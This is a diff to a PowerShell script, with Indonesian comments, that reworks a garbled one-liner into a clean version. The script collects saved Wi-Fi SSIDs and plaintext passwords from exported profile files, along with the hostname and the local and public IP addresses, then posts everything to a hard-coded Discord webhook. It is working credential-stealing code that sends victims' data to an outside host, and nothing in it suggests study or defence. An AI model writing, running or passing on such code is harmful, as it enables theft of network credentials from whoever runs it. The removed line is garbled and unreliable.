@@ -1,1 +1,31 @@
-\$hn = env:computername; pub = (Invoke-WebRequest -Uri 'https://ipify.org' -UseBasicParsing).Content; loc = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi','Ethernet' -ErrorAction SilentlyContinue | Select-Object -First 1).IPAddress; d = Get-ChildItem (Join-Path \(env:temp 'Wi*.xml') \vert{} ForEach-Object { [xml]\)x = Get-Content \(_.FullName; [PSCustomObject]@{ SSID =\)x.WLANProfile.name; Pass = x.WLANProfile.MSM.Security.sharedKey.keyMaterial ; if (d) { text = "Hostname : hn`nPublic IP : $pub`nLocal IP  : \$loc`n`n"; foreach (i in d) { if (i.SSID) text += "{0,-30} {1}`n" -f $i.SSID, $i.Pass } } $msg = "```text`n" + \$text + "```"; Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1552958439356104746/caHQV2SWyyaBZWNkRZKGbBK5-n1MPG9ftzToJBHwg0P-K7ueK7FUIbw79dl-PrSdmrda' -Method Post -Body (ConvertTo-Json @{ content = $msg }) -ContentType 'application/json' -UseBasicParsing }
+# Mengambil data profil Wi-Fi
+$d = Get-ChildItem (Join-Path $env:temp 'Wi*.xml') | ForEach-Object { 
+    [xml]$x = Get-Content $_.FullName
+    [PSCustomObject]@{ 
+        SSID = $x.WLANProfile.name
+        Pass = $x.WLANProfile.MSM.Security.sharedKey.keyMaterial 
+    } 
+}
+
+# Mengambil informasi Hostname dan IP
+$hostname = [System.Net.Dns]::GetHostName()
+$localIP  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress -join ', '
+$publicIP = (Invoke-WebRequest -Uri "https://ipify.org" -UseBasicParsing).Content
+
+# Menyusun konten teks untuk Discord
+$wifiInfo = $d | Out-String
+$contentString = @"
+**System Info:**
+Hostname: $hostname
+Local IP: $localIP
+Public IP: $publicIP
+
+**Wi-Fi Profiles:**
+$wifiInfo
+"@
+
+# Mengirim data jika profil Wi-Fi ditemukan
+if ($d) { 
+    $payload = @{ content = $contentString } | ConvertTo-Json
+    Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1552958439356104746/caHQV2SWyyaBZWNkRZKGbBK5-n1MPG9ftzToJBHwg0P-K7ueK7FUIbw79dl-PrSdmrda' -Method Post -Body $payload -ContentType 'application/json' -UseBasicParsing 
+}
